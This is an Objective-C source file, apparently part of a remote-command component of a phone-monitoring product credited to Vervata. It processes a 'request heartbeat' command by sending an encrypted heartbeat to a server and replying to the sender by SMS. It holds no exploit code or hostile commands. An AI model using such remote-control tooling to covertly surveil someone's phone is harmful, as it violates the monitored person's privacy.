/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestHeartbeatProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestHeartbeatProcessor.h"
#import "DeliveryResponse.h"
#import "DefDDM.h"
#import "DeliveryRequest.h"
#import "SendHeartBeat.h"
#import "ConnectionLog.h"
#import "ConfigurationManager.h"

@interface RequestHeartbeatProcessor (PrivateAPI)
- (void) sendReplySMS: (NSString *) aReplyMessage
		  isProcessCompleted:(BOOL) aIsComplete;
- (void) processRequestHeartBeat;
- (void) acknowldgeMessage ;
- (void) processFinished;
- (void) requestHeartbeatException;
@end

@implementation RequestHeartbeatProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate,aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Purpose:This method is used to initialize the RequestHeartbeatProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestHeartbeatProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
    DLog (@"RequestHeartbeatProcessor--->doProcessingCommand")
	[self processRequestHeartBeat];
}


#pragma mark RequestHeartbeatProcessor Private Methods

/**
 - Method name: processRequestHeartBeat
 - Purpose:This method is used to process Request Heartbeat
 - Argument list and description: No Argument
 - Return description:No Return Type
*/

- (void) processRequestHeartBeat {
	DLog (@"RequestHeartbeatProcessor--->processRequestHeartBeat")
	id <DataDelivery> dataDelivery=[[RemoteCmdUtils sharedRemoteCmdUtils] mDataDelivery];
	SendHeartBeat *commandData = [[SendHeartBeat alloc] init];
	DeliveryRequest *deliveryRequest = [[DeliveryRequest alloc] init];
	[deliveryRequest setMCallerId:kDDC_RCM];
	[deliveryRequest setMMaxRetry:0];
	[deliveryRequest setMRetryTimeout:0];
	[deliveryRequest setMConnectionTimeout:60];
	[deliveryRequest setMEDPType:kEDPTypeSendHeartbeat];
	[deliveryRequest setMCommandCode:[commandData getCommand]];
	[deliveryRequest setMCommandData:commandData];
	[deliveryRequest setMCompressionFlag:1];
	[deliveryRequest setMEncryptionFlag:1];
	[deliveryRequest setMDeliveryListener:self];
	[dataDelivery deliver:deliveryRequest];
	[commandData release];
	[deliveryRequest release];
	[self acknowldgeMessage];
}


/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
*/

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHeartBeatAcknowldge", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when Activate Process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestHeartbeatProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: requestHeartbeatException
 - Purpose:This method is invoked when RequestHeartBeat Failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) requestHeartbeatException  {
	DLog (@"RequestHeartbeatProcessor---->requestHeartbeatException")
	FxException* exception = [FxException exceptionWithName:@"processRequestHeartBeat" andReason:@"RequestHeartBeat Error"];
	[exception setErrorCode:kCmdExceptionErrorServer];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS: (NSString *) aReplyMessage
		  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestHeartbeatProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															      andMessage:aReplyMessage];
	}
	if (aIsComplete) {[self processFinished];}
	else {DLog (@"Sent aknowldge message.");}
		

}

#pragma mark DeliveryListener methods

/**
 - Method name: requestFinished
 - Purpose:This method is invoked when Request HeartBeat Process is finished.
 - Argument list and description: aResponse(DeliveryResponse) 
 - Return description:No Return Type
*/

- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog (@"RequestHeartbeatProcessor--->requestFinished")
	NSString *messageFormat =nil;
	NSString *requestHeartBeatMessage=nil;
	if  ([aResponse mSuccess]) { 
		messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				  andErrorCode:_SUCCESS_];
		requestHeartBeatMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHeartBeat", @"")];
	}
	else {
		// -- Check if the error was caused by the server or not
		//id <ConnectionHistoryManager> connectionManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConnectionHistoryManager];
		//NSArray *allConnectionHistory					= [connectionManager selectAllConnectionHistory];
		//ConnectionLog *lastConnectionLog				= [allConnectionHistory lastObject];
		//NSInteger errorCode								= [lastConnectionLog mErrorCode];
		
		NSInteger errorCode = [aResponse mStatusCode];

		if (errorCode >= 0) {									
			// -- get the reply message from the server's response			
			requestHeartBeatMessage = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																								  andErrorCode:_SUCCESS_];						
			requestHeartBeatMessage = [requestHeartBeatMessage stringByAppendingString:[aResponse mStatusMessage]];
			DLog (@"-- This is the server error code -- %d %@", errorCode, requestHeartBeatMessage)
		} else {
			requestHeartBeatMessage = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																								  andErrorCode:[aResponse mStatusCode]];
		}				
	}		
	[self sendReplySMS:requestHeartBeatMessage isProcessCompleted:YES];
}

/**
 - Method name: updateRequestProgress
 - Purpose:This method is invoked when update is available
 - Argument list and description: aResponse(DeliveryResponse) 
 - Return description:No Return Type
*/

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	  DLog (@"RequestHeartbeatProcessor--->updateRequestProgress")
}


/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
